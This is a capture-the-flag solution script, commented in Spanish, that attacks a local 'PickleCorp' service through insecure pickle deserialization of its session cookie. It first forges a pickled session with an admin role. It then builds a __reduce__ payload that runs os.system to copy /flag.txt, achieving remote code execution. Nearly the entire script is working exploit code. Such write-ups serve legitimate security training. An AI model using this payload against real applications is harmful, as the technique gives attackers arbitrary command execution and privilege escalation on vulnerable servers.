"""
Solución: Pickle Deserialization — PickleCorp
=============================================

El servidor deserializa la cookie de sesión con pickle.loads() sin
verificar su integridad. Esto permite ejecutar código arbitrario al
deserializar un objeto malicioso.

Opción A (simple): forjar un UserSession con role='admin'
  - Python pickle serializa cualquier objeto.
  - Si la clase tiene la misma forma que la esperada, basta con setear role='admin'.

Opción B (RCE): usar __reduce__ para ejecución de comandos
  - pickle llama obj.__reduce__() durante la deserialización.
  - Retornar (callable, args) hace que pickle ejecute callable(*args).
"""
import pickle, base64, requests, re

BASE = 'http://localhost:8080'

# ---- Opción A: Forjar sesión con role='admin' ----

class FakeSession:
    def __init__(self):
        self.username = 'hacker'
        self.role = 'admin'

cookie_a = base64.b64encode(pickle.dumps(FakeSession())).decode()
print(f"[A] Cookie forjada: {cookie_a[:40]}...")

r = requests.get(BASE, cookies={'session': cookie_a})
if 'CTF{' in r.text:
    match = re.search(r'CTF\{[^}]+\}', r.text)
    print(f"[+] Flag (opción A): {match.group(0)}")
else:
    print("[A] Sin flag en respuesta. Intentando opción B...")

    # ---- Opción B: RCE — escribir flag a /tmp y leerla ----
    import os, subprocess

    class RCEPayload:
        def __reduce__(self):
            # Escribir flag en un path accesible
            return (os.system, ('cp /flag.txt /tmp/pwned.txt',))

    cookie_b = base64.b64encode(pickle.dumps(RCEPayload())).decode()
    r2 = requests.get(BASE, cookies={'session': cookie_b})
    print(f"[B] RCE ejecutado. Código: {r2.status_code}")
    print("[*] Verificar /tmp/pwned.txt dentro del contenedor.")
